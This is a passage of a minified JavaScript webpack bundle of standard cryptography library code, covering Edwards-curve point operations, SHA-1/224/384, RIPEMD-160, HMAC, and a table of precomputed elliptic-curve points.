                return (this.x = this.x.redMul(this.z.redInvm())), (this.z = this.curve.one), this;
            }),
            (Point.prototype.getX = function () {
                return this.normalize(), this.x.fromRed();
            });
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        var utils = __webpack_require__(12),
            BN = __webpack_require__(15),
            inherits = __webpack_require__(3),
            Base = __webpack_require__(41),
            assert = utils.assert;
        function EdwardsCurve(conf) {
            (this.twisted = 1 != (0 | conf.a)),
                (this.mOneA = this.twisted && -1 == (0 | conf.a)),
                (this.extended = this.mOneA),
                Base.call(this, "edwards", conf),
                (this.a = new BN(conf.a, 16).umod(this.red.m)),
                (this.a = this.a.toRed(this.red)),
                (this.c = new BN(conf.c, 16).toRed(this.red)),
                (this.c2 = this.c.redSqr()),
                (this.d = new BN(conf.d, 16).toRed(this.red)),
                (this.dd = this.d.redAdd(this.d)),
                assert(!this.twisted || 0 === this.c.fromRed().cmpn(1)),
                (this.oneC = 1 == (0 | conf.c));
        }
        function Point(curve, x, y, z, t) {
            Base.BasePoint.call(this, curve, "projective"),
                null === x && null === y && null === z
                    ? ((this.x = this.curve.zero), (this.y = this.curve.one), (this.z = this.curve.one), (this.t = this.curve.zero), (this.zOne = !0))
                    : ((this.x = new BN(x, 16)),
                      (this.y = new BN(y, 16)),
                      (this.z = z ? new BN(z, 16) : this.curve.one),
                      (this.t = t && new BN(t, 16)),
                      this.x.red || (this.x = this.x.toRed(this.curve.red)),
                      this.y.red || (this.y = this.y.toRed(this.curve.red)),
                      this.z.red || (this.z = this.z.toRed(this.curve.red)),
                      this.t && !this.t.red && (this.t = this.t.toRed(this.curve.red)),
                      (this.zOne = this.z === this.curve.one),
                      this.curve.extended && !this.t && ((this.t = this.x.redMul(this.y)), this.zOne || (this.t = this.t.redMul(this.z.redInvm()))));
        }
        inherits(EdwardsCurve, Base),
            (module.exports = EdwardsCurve),
            (EdwardsCurve.prototype._mulA = function (num) {
                return this.mOneA ? num.redNeg() : this.a.redMul(num);
            }),
            (EdwardsCurve.prototype._mulC = function (num) {
                return this.oneC ? num : this.c.redMul(num);
            }),
            (EdwardsCurve.prototype.jpoint = function (x, y, z, t) {
                return this.point(x, y, z, t);
            }),
            (EdwardsCurve.prototype.pointFromX = function (x, odd) {
                (x = new BN(x, 16)).red || (x = x.toRed(this.red));
                var x2 = x.redSqr(),
                    rhs = this.c2.redSub(this.a.redMul(x2)),
                    lhs = this.one.redSub(this.c2.redMul(this.d).redMul(x2)),
                    y2 = rhs.redMul(lhs.redInvm()),
                    y = y2.redSqrt();
                if (0 !== y.redSqr().redSub(y2).cmp(this.zero)) throw new Error("invalid point");
                var isOdd = y.fromRed().isOdd();
                return ((odd && !isOdd) || (!odd && isOdd)) && (y = y.redNeg()), this.point(x, y);
            }),
            (EdwardsCurve.prototype.pointFromY = function (y, odd) {
                (y = new BN(y, 16)).red || (y = y.toRed(this.red));
                var y2 = y.redSqr(),
                    lhs = y2.redSub(this.c2),
                    rhs = y2.redMul(this.d).redMul(this.c2).redSub(this.a),
                    x2 = lhs.redMul(rhs.redInvm());
                if (0 === x2.cmp(this.zero)) {
                    if (odd) throw new Error("invalid point");
                    return this.point(this.zero, y);
                }
                var x = x2.redSqrt();
                if (0 !== x.redSqr().redSub(x2).cmp(this.zero)) throw new Error("invalid point");
                return x.fromRed().isOdd() !== odd && (x = x.redNeg()), this.point(x, y);
            }),
            (EdwardsCurve.prototype.validate = function (point) {
                if (point.isInfinity()) return !0;
                point.normalize();
                var x2 = point.x.redSqr(),
                    y2 = point.y.redSqr(),
                    lhs = x2.redMul(this.a).redAdd(y2),
                    rhs = this.c2.redMul(this.one.redAdd(this.d.redMul(x2).redMul(y2)));
                return 0 === lhs.cmp(rhs);
            }),
            inherits(Point, Base.BasePoint),
            (EdwardsCurve.prototype.pointFromJSON = function (obj) {
                return Point.fromJSON(this, obj);
            }),
            (EdwardsCurve.prototype.point = function (x, y, z, t) {
                return new Point(this, x, y, z, t);
            }),
            (Point.fromJSON = function (curve, obj) {
                return new Point(curve, obj[0], obj[1], obj[2]);
            }),
            (Point.prototype.inspect = function () {
                return this.isInfinity() ? "<EC Point Infinity>" : "<EC Point x: " + this.x.fromRed().toString(16, 2) + " y: " + this.y.fromRed().toString(16, 2) + " z: " + this.z.fromRed().toString(16, 2) + ">";
            }),
            (Point.prototype.isInfinity = function () {
                return 0 === this.x.cmpn(0) && (0 === this.y.cmp(this.z) || (this.zOne && 0 === this.y.cmp(this.curve.c)));
            }),
            (Point.prototype._extDbl = function () {
                var a = this.x.redSqr(),
                    b = this.y.redSqr(),
                    c = this.z.redSqr();
                c = c.redIAdd(c);
                var d = this.curve._mulA(a),
                    e = this.x.redAdd(this.y).redSqr().redISub(a).redISub(b),
                    g = d.redAdd(b),
                    f = g.redSub(c),
                    h = d.redSub(b),
                    nx = e.redMul(f),
                    ny = g.redMul(h),
                    nt = e.redMul(h),
                    nz = f.redMul(g);
                return this.curve.point(nx, ny, nz, nt);
            }),
            (Point.prototype._projDbl = function () {
                var nx,
                    ny,
                    nz,
                    e,
                    h,
                    j,
                    b = this.x.redAdd(this.y).redSqr(),
                    c = this.x.redSqr(),
                    d = this.y.redSqr();
                if (this.curve.twisted) {
                    var f = (e = this.curve._mulA(c)).redAdd(d);
                    this.zOne
                        ? ((nx = b.redSub(c).redSub(d).redMul(f.redSub(this.curve.two))), (ny = f.redMul(e.redSub(d))), (nz = f.redSqr().redSub(f).redSub(f)))
                        : ((h = this.z.redSqr()), (j = f.redSub(h).redISub(h)), (nx = b.redSub(c).redISub(d).redMul(j)), (ny = f.redMul(e.redSub(d))), (nz = f.redMul(j)));
                } else (e = c.redAdd(d)), (h = this.curve._mulC(this.z).redSqr()), (j = e.redSub(h).redSub(h)), (nx = this.curve._mulC(b.redISub(e)).redMul(j)), (ny = this.curve._mulC(e).redMul(c.redISub(d))), (nz = e.redMul(j));
                return this.curve.point(nx, ny, nz);
            }),
            (Point.prototype.dbl = function () {
                return this.isInfinity() ? this : this.curve.extended ? this._extDbl() : this._projDbl();
            }),
            (Point.prototype._extAdd = function (p) {
                var a = this.y.redSub(this.x).redMul(p.y.redSub(p.x)),
                    b = this.y.redAdd(this.x).redMul(p.y.redAdd(p.x)),
                    c = this.t.redMul(this.curve.dd).redMul(p.t),
                    d = this.z.redMul(p.z.redAdd(p.z)),
                    e = b.redSub(a),
                    f = d.redSub(c),
                    g = d.redAdd(c),
                    h = b.redAdd(a),
                    nx = e.redMul(f),
                    ny = g.redMul(h),
                    nt = e.redMul(h),
                    nz = f.redMul(g);
                return this.curve.point(nx, ny, nz, nt);
            }),
            (Point.prototype._projAdd = function (p) {
                var ny,
                    nz,
                    a = this.z.redMul(p.z),
                    b = a.redSqr(),
                    c = this.x.redMul(p.x),
                    d = this.y.redMul(p.y),
                    e = this.curve.d.redMul(c).redMul(d),
                    f = b.redSub(e),
                    g = b.redAdd(e),
                    tmp = this.x.redAdd(this.y).redMul(p.x.redAdd(p.y)).redISub(c).redISub(d),
                    nx = a.redMul(f).redMul(tmp);
                return this.curve.twisted ? ((ny = a.redMul(g).redMul(d.redSub(this.curve._mulA(c)))), (nz = f.redMul(g))) : ((ny = a.redMul(g).redMul(d.redSub(c))), (nz = this.curve._mulC(f).redMul(g))), this.curve.point(nx, ny, nz);
            }),
            (Point.prototype.add = function (p) {
                return this.isInfinity() ? p : p.isInfinity() ? this : this.curve.extended ? this._extAdd(p) : this._projAdd(p);
            }),
            (Point.prototype.mul = function (k) {
                return this._hasDoubles(k) ? this.curve._fixedNafMul(this, k) : this.curve._wnafMul(this, k);
            }),
            (Point.prototype.mulAdd = function (k1, p, k2) {
                return this.curve._wnafMulAdd(1, [this, p], [k1, k2], 2, !1);
            }),
            (Point.prototype.jmulAdd = function (k1, p, k2) {
                return this.curve._wnafMulAdd(1, [this, p], [k1, k2], 2, !0);
            }),
            (Point.prototype.normalize = function () {
                if (this.zOne) return this;
                var zi = this.z.redInvm();
                return (this.x = this.x.redMul(zi)), (this.y = this.y.redMul(zi)), this.t && (this.t = this.t.redMul(zi)), (this.z = this.curve.one), (this.zOne = !0), this;
            }),
            (Point.prototype.neg = function () {
                return this.curve.point(this.x.redNeg(), this.y, this.z, this.t && this.t.redNeg());
            }),
            (Point.prototype.getX = function () {
                return this.normalize(), this.x.fromRed();
            }),
            (Point.prototype.getY = function () {
                return this.normalize(), this.y.fromRed();
            }),
            (Point.prototype.eq = function (other) {
                return this === other || (0 === this.getX().cmp(other.getX()) && 0 === this.getY().cmp(other.getY()));
            }),
            (Point.prototype.eqXToP = function (x) {
                var rx = x.toRed(this.curve.red).redMul(this.z);
                if (0 === this.x.cmp(rx)) return !0;
                for (var xc = x.clone(), t = this.curve.redN.redMul(this.z); ; ) {
                    if ((xc.iadd(this.curve.n), xc.cmp(this.curve.p) >= 0)) return !1;
                    if ((rx.redIAdd(t), 0 === this.x.cmp(rx))) return !0;
                }
            }),
            (Point.prototype.toP = Point.prototype.normalize),
            (Point.prototype.mixedAdd = Point.prototype.add);
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        (exports.sha1 = __webpack_require__(257)), (exports.sha224 = __webpack_require__(258)), (exports.sha256 = __webpack_require__(122)), (exports.sha384 = __webpack_require__(259)), (exports.sha512 = __webpack_require__(123));
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        var utils = __webpack_require__(13),
            common = __webpack_require__(36),
            shaCommon = __webpack_require__(121),
            rotl32 = utils.rotl32,
            sum32 = utils.sum32,
            sum32_5 = utils.sum32_5,
            ft_1 = shaCommon.ft_1,
            BlockHash = common.BlockHash,
            sha1_K = [1518500249, 1859775393, 2400959708, 3395469782];
        function SHA1() {
            if (!(this instanceof SHA1)) return new SHA1();
            BlockHash.call(this), (this.h = [1732584193, 4023233417, 2562383102, 271733878, 3285377520]), (this.W = new Array(80));
        }
        utils.inherits(SHA1, BlockHash),
            (module.exports = SHA1),
            (SHA1.blockSize = 512),
            (SHA1.outSize = 160),
            (SHA1.hmacStrength = 80),
            (SHA1.padLength = 64),
            (SHA1.prototype._update = function (msg, start) {
                for (var W = this.W, i = 0; i < 16; i++) W[i] = msg[start + i];
                for (; i < W.length; i++) W[i] = rotl32(W[i - 3] ^ W[i - 8] ^ W[i - 14] ^ W[i - 16], 1);
                var a = this.h[0],
                    b = this.h[1],
                    c = this.h[2],
                    d = this.h[3],
                    e = this.h[4];
                for (i = 0; i < W.length; i++) {
                    var s = ~~(i / 20),
                        t = sum32_5(rotl32(a, 5), ft_1(s, b, c, d), e, W[i], sha1_K[s]);
                    (e = d), (d = c), (c = rotl32(b, 30)), (b = a), (a = t);
                }
                (this.h[0] = sum32(this.h[0], a)), (this.h[1] = sum32(this.h[1], b)), (this.h[2] = sum32(this.h[2], c)), (this.h[3] = sum32(this.h[3], d)), (this.h[4] = sum32(this.h[4], e));
            }),
            (SHA1.prototype._digest = function (enc) {
                return "hex" === enc ? utils.toHex32(this.h, "big") : utils.split32(this.h, "big");
            });
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        var utils = __webpack_require__(13),
            SHA256 = __webpack_require__(122);
        function SHA224() {
            if (!(this instanceof SHA224)) return new SHA224();
            SHA256.call(this), (this.h = [3238371032, 914150663, 812702999, 4144912697, 4290775857, 1750603025, 1694076839, 3204075428]);
        }
        utils.inherits(SHA224, SHA256),
            (module.exports = SHA224),
            (SHA224.blockSize = 512),
            (SHA224.outSize = 224),
            (SHA224.hmacStrength = 192),
            (SHA224.padLength = 64),
            (SHA224.prototype._digest = function (enc) {
                return "hex" === enc ? utils.toHex32(this.h.slice(0, 7), "big") : utils.split32(this.h.slice(0, 7), "big");
            });
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        var utils = __webpack_require__(13),
            SHA512 = __webpack_require__(123);
        function SHA384() {
            if (!(this instanceof SHA384)) return new SHA384();
            SHA512.call(this), (this.h = [3418070365, 3238371032, 1654270250, 914150663, 2438529370, 812702999, 355462360, 4144912697, 1731405415, 4290775857, 2394180231, 1750603025, 3675008525, 1694076839, 1203062813, 3204075428]);
        }
        utils.inherits(SHA384, SHA512),
            (module.exports = SHA384),
            (SHA384.blockSize = 1024),
            (SHA384.outSize = 384),
            (SHA384.hmacStrength = 192),
            (SHA384.padLength = 128),
            (SHA384.prototype._digest = function (enc) {
                return "hex" === enc ? utils.toHex32(this.h.slice(0, 12), "big") : utils.split32(this.h.slice(0, 12), "big");
            });
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        var utils = __webpack_require__(13),
            common = __webpack_require__(36),
            rotl32 = utils.rotl32,
            sum32 = utils.sum32,
            sum32_3 = utils.sum32_3,
            sum32_4 = utils.sum32_4,
            BlockHash = common.BlockHash;
        function RIPEMD160() {
            if (!(this instanceof RIPEMD160)) return new RIPEMD160();
            BlockHash.call(this), (this.h = [1732584193, 4023233417, 2562383102, 271733878, 3285377520]), (this.endian = "little");
        }
        function f(j, x, y, z) {
            return j <= 15 ? x ^ y ^ z : j <= 31 ? (x & y) | (~x & z) : j <= 47 ? (x | ~y) ^ z : j <= 63 ? (x & z) | (y & ~z) : x ^ (y | ~z);
        }
        function K(j) {
            return j <= 15 ? 0 : j <= 31 ? 1518500249 : j <= 47 ? 1859775393 : j <= 63 ? 2400959708 : 2840853838;
        }
        function Kh(j) {
            return j <= 15 ? 1352829926 : j <= 31 ? 1548603684 : j <= 47 ? 1836072691 : j <= 63 ? 2053994217 : 0;
        }
        utils.inherits(RIPEMD160, BlockHash),
            (exports.ripemd160 = RIPEMD160),
            (RIPEMD160.blockSize = 512),
            (RIPEMD160.outSize = 160),
            (RIPEMD160.hmacStrength = 192),
            (RIPEMD160.padLength = 64),
            (RIPEMD160.prototype._update = function (msg, start) {
                for (var A = this.h[0], B = this.h[1], C = this.h[2], D = this.h[3], E = this.h[4], Ah = A, Bh = B, Ch = C, Dh = D, Eh = E, j = 0; j < 80; j++) {
                    var T = sum32(rotl32(sum32_4(A, f(j, B, C, D), msg[r[j] + start], K(j)), s[j]), E);
                    (A = E), (E = D), (D = rotl32(C, 10)), (C = B), (B = T), (T = sum32(rotl32(sum32_4(Ah, f(79 - j, Bh, Ch, Dh), msg[rh[j] + start], Kh(j)), sh[j]), Eh)), (Ah = Eh), (Eh = Dh), (Dh = rotl32(Ch, 10)), (Ch = Bh), (Bh = T);
                }
                (T = sum32_3(this.h[1], C, Dh)), (this.h[1] = sum32_3(this.h[2], D, Eh)), (this.h[2] = sum32_3(this.h[3], E, Ah)), (this.h[3] = sum32_3(this.h[4], A, Bh)), (this.h[4] = sum32_3(this.h[0], B, Ch)), (this.h[0] = T);
            }),
            (RIPEMD160.prototype._digest = function (enc) {
                return "hex" === enc ? utils.toHex32(this.h, "little") : utils.split32(this.h, "little");
            });
        var r = [
                0,
                1,
                2,
                3,
                4,
                5,
                6,
                7,
                8,
                9,
                10,
                11,
                12,
                13,
                14,
                15,
                7,
                4,
                13,
                1,
                10,
                6,
                15,
                3,
                12,
                0,
                9,
                5,
                2,
                14,
                11,
                8,
                3,
                10,
                14,
                4,
                9,
                15,
                8,
                1,
                2,
                7,
                0,
                6,
                13,
                11,
                5,
                12,
                1,
                9,
                11,
                10,
                0,
                8,
                12,
                4,
                13,
                3,
                7,
                15,
                14,
                5,
                6,
                2,
                4,
                0,
                5,
                9,
                7,
                12,
                2,
                10,
                14,
                1,
                3,
                8,
                11,
                6,
                15,
                13,
            ],
            rh = [
                5,
                14,
                7,
                0,
                9,
                2,
                11,
                4,
                13,
                6,
                15,
                8,
                1,
                10,
                3,
                12,
                6,
                11,
                3,
                7,
                0,
                13,
                5,
                10,
                14,
                15,
                8,
                12,
                4,
                9,
                1,
                2,
                15,
                5,
                1,
                3,
                7,
                14,
                6,
                9,
                11,
                8,
                12,
                2,
                10,
                0,
                4,
                13,
                8,
                6,
                4,
                1,
                3,
                11,
                15,
                0,
                5,
                12,
                2,
                13,
                9,
                7,
                10,
                14,
                12,
                15,
                10,
                4,
                1,
                5,
                8,
                7,
                6,
                2,
                13,
                14,
                0,
                3,
                9,
                11,
            ],
            s = [
                11,
                14,
                15,
                12,
                5,
                8,
                7,
                9,
                11,
                13,
                14,
                15,
                6,
                7,
                9,
                8,
                7,
                6,
                8,
                13,
                11,
                9,
                7,
                15,
                7,
                12,
                15,
                9,
                11,
                7,
                13,
                12,
                11,
                13,
                6,
                7,
                14,
                9,
                13,
                15,
                14,
                8,
                13,
                6,
                5,
                12,
                7,
                5,
                11,
                12,
                14,
                15,
                14,
                15,
                9,
                8,
                9,
                14,
                5,
                6,
                8,
                6,
                5,
                12,
                9,
                15,
                5,
                11,
                6,
                8,
                13,
                12,
                5,
                12,
                13,
                14,
                11,
                8,
                5,
                6,
            ],
            sh = [
                8,
                9,
                9,
                11,
                13,
                15,
                15,
                5,
                7,
                7,
                8,
                11,
                14,
                14,
                12,
                6,
                9,
                13,
                15,
                7,
                12,
                8,
                9,
                11,
                7,
                7,
                12,
                7,
                6,
                15,
                13,
                11,
                9,
                7,
                15,
                11,
                8,
                6,
                6,
                14,
                12,
                13,
                5,
                14,
                13,
                13,
                7,
                5,
                15,
                5,
                8,
                11,
                14,
                14,
                6,
                14,
                6,
                9,
                12,
                9,
                12,
                5,
                15,
                8,
                8,
                5,
                12,
                9,
                12,
                5,
                14,
                6,
                8,
                13,
                6,
                5,
                15,
                13,
                11,
                11,
            ];
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        var utils = __webpack_require__(13),
            assert = __webpack_require__(11);
        function Hmac(hash, key, enc) {
            if (!(this instanceof Hmac)) return new Hmac(hash, key, enc);
            (this.Hash = hash), (this.blockSize = hash.blockSize / 8), (this.outSize = hash.outSize / 8), (this.inner = null), (this.outer = null), this._init(utils.toArray(key, enc));
        }
        (module.exports = Hmac),
            (Hmac.prototype._init = function (key) {
                key.length > this.blockSize && (key = new this.Hash().update(key).digest()), assert(key.length <= this.blockSize);
                for (var i = key.length; i < this.blockSize; i++) key.push(0);
                for (i = 0; i < key.length; i++) key[i] ^= 54;
                for (this.inner = new this.Hash().update(key), i = 0; i < key.length; i++) key[i] ^= 106;
                this.outer = new this.Hash().update(key);
            }),
            (Hmac.prototype.update = function (msg, enc) {
                return this.inner.update(msg, enc), this;
            }),
            (Hmac.prototype.digest = function (enc) {
                return this.outer.update(this.inner.digest()), this.outer.digest(enc);
            });
    },
    function (module, exports) {
        module.exports = {
            doubles: {
                step: 4,
                points: [
                    ["e60fce93b59e9ec53011aabc21c23e97b2a31369b87a5ae9c44ee89e2a6dec0a", "f7e3507399e595929db99f34f57937101296891e44d23f0be1f32cce69616821"],
                    ["8282263212c609d9ea2a6e3e172de238d8c39cabd5ac1ca10646e23fd5f51508", "11f8a8098557dfe45e8256e830b60ace62d613ac2f7b17bed31b6eaff6e26caf"],
                    ["175e159f728b865a72f99cc6c6fc846de0b93833fd2222ed73fce5b551e5b739", "d3506e0d9e3c79eba4ef97a51ff71f5eacb5955add24345c6efa6ffee9fed695"],
                    ["363d90d447b00c9c99ceac05b6262ee053441c7e55552ffe526bad8f83ff4640", "4e273adfc732221953b445397f3363145b9a89008199ecb62003c7f3bee9de9"],
                    ["8b4b5f165df3c2be8c6244b5b745638843e4a781a15bcd1b69f79a55dffdf80c", "4aad0a6f68d308b4b3fbd7813ab0da04f9e336546162ee56b3eff0c65fd4fd36"],
                    ["723cbaa6e5db996d6bf771c00bd548c7b700dbffa6c0e77bcb6115925232fcda", "96e867b5595cc498a921137488824d6e2660a0653779494801dc069d9eb39f5f"],
                    ["eebfa4d493bebf98ba5feec812c2d3b50947961237a919839a533eca0e7dd7fa", "5d9a8ca3970ef0f269ee7edaf178089d9ae4cdc3a711f712ddfd4fdae1de8999"],
                    ["100f44da696e71672791d0a09b7bde459f1215a29b3c03bfefd7835b39a48db0", "cdd9e13192a00b772ec8f3300c090666b7ff4a18ff5195ac0fbd5cd62bc65a09"],
                    ["e1031be262c7ed1b1dc9227a4a04c017a77f8d4464f3b3852c8acde6e534fd2d", "9d7061928940405e6bb6a4176597535af292dd419e1ced79a44f18f29456a00d"],
                    ["feea6cae46d55b530ac2839f143bd7ec5cf8b266a41d6af52d5e688d9094696d", "e57c6b6c97dce1bab06e4e12bf3ecd5c981c8957cc41442d3155debf18090088"],
                    ["da67a91d91049cdcb367be4be6ffca3cfeed657d808583de33fa978bc1ec6cb1", "9bacaa35481642bc41f463f7ec9780e5dec7adc508f740a17e9ea8e27a68be1d"],
                    ["53904faa0b334cdda6e000935ef22151ec08d0f7bb11069f57545ccc1a37b7c0", "5bc087d0bc80106d88c9eccac20d3c1c13999981e14434699dcb096b022771c8"],
                    ["8e7bcd0bd35983a7719cca7764ca906779b53a043a9b8bcaeff959f43ad86047", "10b7770b2a3da4b3940310420ca9514579e88e2e47fd68b3ea10047e8460372a"],
                    ["385eed34c1cdff21e6d0818689b81bde71a7f4f18397e6690a841e1599c43862", "283bebc3e8ea23f56701de19e9ebf4576b304eec2086dc8cc0458fe5542e5453"],
                    ["6f9d9b803ecf191637c73a4413dfa180fddf84a5947fbc9c606ed86c3fac3a7", "7c80c68e603059ba69b8e2a30e45c4d47ea4dd2f5c281002d86890603a842160"],
                    ["3322d401243c4e2582a2147c104d6ecbf774d163db0f5e5313b7e0e742d0e6bd", "56e70797e9664ef5bfb019bc4ddaf9b72805f63ea2873af624f3a2e96c28b2a0"],
                    ["85672c7d2de0b7da2bd1770d89665868741b3f9af7643397721d74d28134ab83", "7c481b9b5b43b2eb6374049bfa62c2e5e77f17fcc5298f44c8e3094f790313a6"],
                    ["948bf809b1988a46b06c9f1919413b10f9226c60f668832ffd959af60c82a0a", "53a562856dcb6646dc6b74c5d1c3418c6d4dff08c97cd2bed4cb7f88d8c8e589"],
                    ["6260ce7f461801c34f067ce0f02873a8f1b0e44dfc69752accecd819f38fd8e8", "bc2da82b6fa5b571a7f09049776a1ef7ecd292238051c198c1a84e95b2b4ae17"],
                    ["e5037de0afc1d8d43d8348414bbf4103043ec8f575bfdc432953cc8d2037fa2d", "4571534baa94d3b5f9f98d09fb990bddbd5f5b03ec481f10e0e5dc841d755bda"],
                    ["e06372b0f4a207adf5ea905e8f1771b4e7e8dbd1c6a6c5b725866a0ae4fce725", "7a908974bce18cfe12a27bb2ad5a488cd7484a7787104870b27034f94eee31dd"],
                    ["213c7a715cd5d45358d0bbf9dc0ce02204b10bdde2a3f58540ad6908d0559754", "4b6dad0b5ae462507013ad06245ba190bb4850f5f36a7eeddff2c27534b458f2"],
                    ["4e7c272a7af4b34e8dbb9352a5419a87e2838c70adc62cddf0cc3a3b08fbd53c", "17749c766c9d0b18e16fd09f6def681b530b9614bff7dd33e0b3941817dcaae6"],
                    ["fea74e3dbe778b1b10f238ad61686aa5c76e3db2be43057632427e2840fb27b6", "6e0568db9b0b13297cf674deccb6af93126b596b973f7b77701d3db7f23cb96f"],
                    ["76e64113f677cf0e10a2570d599968d31544e179b760432952c02a4417bdde39", "c90ddf8dee4e95cf577066d70681f0d35e2a33d2b56d2032b4b1752d1901ac01"],
                    ["c738c56b03b2abe1e8281baa743f8f9a8f7cc643df26cbee3ab150242bcbb891", "893fb578951ad2537f718f2eacbfbbbb82314eef7880cfe917e735d9699a84c3"],
                    ["d895626548b65b81e264c7637c972877d1d72e5f3a925014372e9f6588f6c14b", "febfaa38f2bc7eae728ec60818c340eb03428d632bb067e179363ed75d7d991f"],
                    ["b8da94032a957518eb0f6433571e8761ceffc73693e84edd49150a564f676e03", "2804dfa44805a1e4d7c99cc9762808b092cc584d95ff3b511488e4e74efdf6e7"],
                    ["e80fea14441fb33a7d8adab9475d7fab2019effb5156a792f1a11778e3c0df5d", "eed1de7f638e00771e89768ca3ca94472d155e80af322ea9fcb4291b6ac9ec78"],
                    ["a301697bdfcd704313ba48e51d567543f2a182031efd6915ddc07bbcc4e16070", "7370f91cfb67e4f5081809fa25d40f9b1735dbf7c0a11a130c0d1a041e177ea1"],
                    ["90ad85b389d6b936463f9d0512678de208cc330b11307fffab7ac63e3fb04ed4", "e507a3620a38261affdcbd9427222b839aefabe1582894d991d4d48cb6ef150"],
                    ["8f68b9d2f63b5f339239c1ad981f162ee88c5678723ea3351b7b444c9ec4c0da", "662a9f2dba063986de1d90c2b6be215dbbea2cfe95510bfdf23cbf79501fff82"],
                    ["e4f3fb0176af85d65ff99ff9198c36091f48e86503681e3e6686fd5053231e11", "1e63633ad0ef4f1c1661a6d0ea02b7286cc7e74ec951d1c9822c38576feb73bc"],
                    ["8c00fa9b18ebf331eb961537a45a4266c7034f2f0d4e1d0716fb6eae20eae29e", "efa47267fea521a1a9dc343a3736c974c2fadafa81e36c54e7d2a4c66702414b"],
                    ["e7a26ce69dd4829f3e10cec0a9e98ed3143d084f308b92c0997fddfc60cb3e41", "2a758e300fa7984b471b006a1aafbb18d0a6b2c0420e83e20e8a9421cf2cfd51"],
                    ["b6459e0ee3662ec8d23540c223bcbdc571cbcb967d79424f3cf29eb3de6b80ef", "67c876d06f3e06de1dadf16e5661db3c4b3ae6d48e35b2ff30bf0b61a71ba45"],
                    ["d68a80c8280bb840793234aa118f06231d6f1fc67e73c5a5deda0f5b496943e8", "db8ba9fff4b586d00c4b1f9177b0e28b5b0e7b8f7845295a294c84266b133120"],
                    ["324aed7df65c804252dc0270907a30b09612aeb973449cea4095980fc28d3d5d", "648a365774b61f2ff130c0c35aec1f4f19213b0c7e332843967224af96ab7c84"],
                    ["4df9c14919cde61f6d51dfdbe5fee5dceec4143ba8d1ca888e8bd373fd054c96", "35ec51092d8728050974c23a1d85d4b5d506cdc288490192ebac06cad10d5d"],
                    ["9c3919a84a474870faed8a9c1cc66021523489054d7f0308cbfc99c8ac1f98cd", "ddb84f0f4a4ddd57584f044bf260e641905326f76c64c8e6be7e5e03d4fc599d"],
                    ["6057170b1dd12fdf8de05f281d8e06bb91e1493a8b91d4cc5a21382120a959e5", "9a1af0b26a6a4807add9a2daf71df262465152bc3ee24c65e899be932385a2a8"],
                    ["a576df8e23a08411421439a4518da31880cef0fba7d4df12b1a6973eecb94266", "40a6bf20e76640b2c92b97afe58cd82c432e10a7f514d9f3ee8be11ae1b28ec8"],
                    ["7778a78c28dec3e30a05fe9629de8c38bb30d1f5cf9a3a208f763889be58ad71", "34626d9ab5a5b22ff7098e12f2ff580087b38411ff24ac563b513fc1fd9f43ac"],
                    ["928955ee637a84463729fd30e7afd2ed5f96274e5ad7e5cb09eda9c06d903ac", "c25621003d3f42a827b78a13093a95eeac3d26efa8a8d83fc5180e935bcd091f"],
                    ["85d0fef3ec6db109399064f3a0e3b2855645b4a907ad354527aae75163d82751", "1f03648413a38c0be29d496e582cf5663e8751e96877331582c237a24eb1f962"],
                    ["ff2b0dce97eece97c1c9b6041798b85dfdfb6d8882da20308f5404824526087e", "493d13fef524ba188af4c4dc54d07936c7b7ed6fb90e2ceb2c951e01f0c29907"],
                    ["827fbbe4b1e880ea9ed2b2e6301b212b57f1ee148cd6dd28780e5e2cf856e241", "c60f9c923c727b0b71bef2c67d1d12687ff7a63186903166d605b68baec293ec"],
                    ["eaa649f21f51bdbae7be4ae34ce6e5217a58fdce7f47f9aa7f3b58fa2120e2b3", "be3279ed5bbbb03ac69a80f89879aa5a01a6b965f13f7e59d47a5305ba5ad93d"],
                    ["e4a42d43c5cf169d9391df6decf42ee541b6d8f0c9a137401e23632dda34d24f", "4d9f92e716d1c73526fc99ccfb8ad34ce886eedfa8d8e4f13a7f7131deba9414"],
                    ["1ec80fef360cbdd954160fadab352b6b92b53576a88fea4947173b9d4300bf19", "aeefe93756b5340d2f3a4958a7abbf5e0146e77f6295a07b671cdc1cc107cefd"],
                    ["146a778c04670c2f91b00af4680dfa8bce3490717d58ba889ddb5928366642be", "b318e0ec3354028add669827f9d4b2870aaa971d2f7e5ed1d0b297483d83efd0"],
                    ["fa50c0f61d22e5f07e3acebb1aa07b128d0012209a28b9776d76a8793180eef9", "6b84c6922397eba9b72cd2872281a68a5e683293a57a213b38cd8d7d3f4f2811"],
                    ["da1d61d0ca721a11b1a5bf6b7d88e8421a288ab5d5bba5220e53d32b5f067ec2", "8157f55a7c99306c79c0766161c91e2966a73899d279b48a655fba0f1ad836f1"],
                    ["a8e282ff0c9706907215ff98e8fd416615311de0446f1e062a73b0610d064e13", "7f97355b8db81c09abfb7f3c5b2515888b679a3e50dd6bd6cef7c73111f4cc0c"],
                    ["174a53b9c9a285872d39e56e6913cab15d59b1fa512508c022f382de8319497c", "ccc9dc37abfc9c1657b4155f2c47f9e6646b3a1d8cb9854383da13ac079afa73"],
                    ["959396981943785c3d3e57edf5018cdbe039e730e4918b3d884fdff09475b7ba", "2e7e552888c331dd8ba0386a4b9cd6849c653f64c8709385e9b8abf87524f2fd"],
                    ["d2a63a50ae401e56d645a1153b109a8fcca0a43d561fba2dbb51340c9d82b151", "e82d86fb6443fcb7565aee58b2948220a70f750af484ca52d4142174dcf89405"],
                    ["64587e2335471eb890ee7896d7cfdc866bacbdbd3839317b3436f9b45617e073", "d99fcdd5bf6902e2ae96dd6447c299a185b90a39133aeab358299e5e9faf6589"],
                    ["8481bde0e4e4d885b3a546d3e549de042f0aa6cea250e7fd358d6c86dd45e458", "38ee7b8cba5404dd84a25bf39cecb2ca900a79c42b262e556d64b1b59779057e"],
                    ["13464a57a78102aa62b6979ae817f4637ffcfed3c4b1ce30bcd6303f6caf666b", "69be159004614580ef7e433453ccb0ca48f300a81d0942e13f495a907f6ecc27"],
                    ["bc4a9df5b713fe2e9aef430bcc1dc97a0cd9ccede2f28588cada3a0d2d83f366", "d3a81ca6e785c06383937adf4b798caa6e8a9fbfa547b16d758d666581f33c1"],
